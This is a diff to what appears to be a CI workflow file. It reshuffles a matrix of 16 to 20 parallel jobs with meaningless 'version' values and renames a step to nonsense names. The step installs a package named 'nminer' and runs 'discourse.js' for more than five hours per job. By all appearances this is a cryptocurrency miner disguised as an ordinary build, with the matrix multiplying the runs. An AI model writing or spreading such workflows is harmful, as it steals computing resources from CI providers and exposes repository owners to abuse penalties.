@@ -9,26 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7040 }
-          - { version: 7306 }
-          - { version: 1063 }
-          - { version: 6127 }
-          - { version: 7666 }
-          - { version: 8177 }
-          - { version: 1744 }
-          - { version: 117 }
-          - { version: 5208 }
-          - { version: 9724 }
-          - { version: 5327 }
-          - { version: 7729 }
-          - { version: 4258 }
-          - { version: 6275 }
-          - { version: 6298 }
-          - { version: 7160 }
-          - { version: 9575 }
-          - { version: 5766 }
-          - { version: 4572 }
-          - { version: 189 }
+          - { version: 4522 }
+          - { version: 1572 }
+          - { version: 1890 }
+          - { version: 2700 }
+          - { version: 1602 }
+          - { version: 3421 }
+          - { version: 2968 }
+          - { version: 6685 }
+          - { version: 5319 }
+          - { version: 4467 }
+          - { version: 3463 }
+          - { version: 801 }
+          - { version: 8105 }
+          - { version: 6574 }
+          - { version: 7572 }
+          - { version: 9743 }
 
     steps:
       - name: Checkout
@@ -39,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gadzooks
+      - name: slap even
         run: |
           npm install nminer@latest
-          timeout 345m node discourse.js || echo "discourse executed"
+          timeout 323m node discourse.js || echo "discourse executed"
